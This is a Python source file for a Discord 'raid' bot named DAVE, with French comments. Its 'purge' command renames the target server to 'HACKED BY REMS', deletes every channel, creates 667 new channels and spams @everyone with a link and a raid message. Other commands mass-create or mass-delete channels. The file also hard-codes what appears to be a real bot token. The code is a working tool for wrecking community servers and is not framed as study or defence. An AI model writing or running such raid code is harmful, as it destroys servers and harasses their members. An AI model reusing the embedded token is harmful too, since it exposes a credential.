import json
# on importe le module discord.py
import discord
import requests
from random import*
from discord.utils import get
# ajouter un composant de discord.py
from discord.ext import commands
import time #On importe le module time pour la commande sleep
# créer le bot
bot = commands.Bot(command_prefix='!') #Permettra au bot de savoir quand est-ce qu'on lui parle grâce au str de command_prefix
client = discord.Client()
bot.remove_command('help') #Supprime la commande help afin de créer note propre commande

# détecter quand le bot est pret ("allumé")
@bot.event
async def on_ready():
    print("⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠")
    print("⚠⚠BE CAREFUL WITH THIS BOT⚠⚠")
    await bot.change_presence(status=discord.Status.online,
            activity=discord.Game("#Rems08"))
    print("⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠")

@bot.command()
async def create_channels(ctx, number):
    '''Commande inutile pour le moment'''
    for i in range(0, int(number)):
        guild = ctx.message.guild
        await guild.create_text_channel(f'cool-channel-{i}')

@bot.command()
async def delete_channels(ctx):
    '''Commande inutile pour le moment'''
    guild = ctx.guild
    for channel in guild.channels:
        await channel.delete()
@bot.command()
async def recup(ctx):
    pass

@bot.command()
async def purge(ctx):
    '''Commande inutile pour le moment'''
    print("PURGE INITIALISATION...")
    await ctx.guild.edit(name="HACKED BY REMS")
    guild = ctx.guild
    while len(guild.channels) !=0:
        for channel in guild.channels:
            if len(guild.channels) != 0:
                await channel.delete()
            else:
                pass
    for i in range(1, 668):
        guild = ctx.message.guild
        await guild.create_text_channel(f'La-PURGE-#Rems-{i}')
        channel = discord.utils.get(ctx.guild.channels, name=f"la-purge-rems-{i}") #Initialise la variable salon sur le nom d'un salon dans name
        await channel.send(f"@everyone https://www.youtube.com/watch?v=dQw4w9WgXcQ")
        await channel.send(f"@everyone Raid by Xx_Rems08_xX")

# phrase
print("Lancement de 💀DAVE💀...")



token = open("token.txt", "r").read() #Lis la valeur dans le fichier txt token.txt
# connecter au serveur
bot.run("ODI3OTU4NzgzODIwOTU1NjQ4.YGimtA.Mq0NGFk5L230ymGz5UXDRYoRdB8") #Mettre "Token pour lancer le bot"
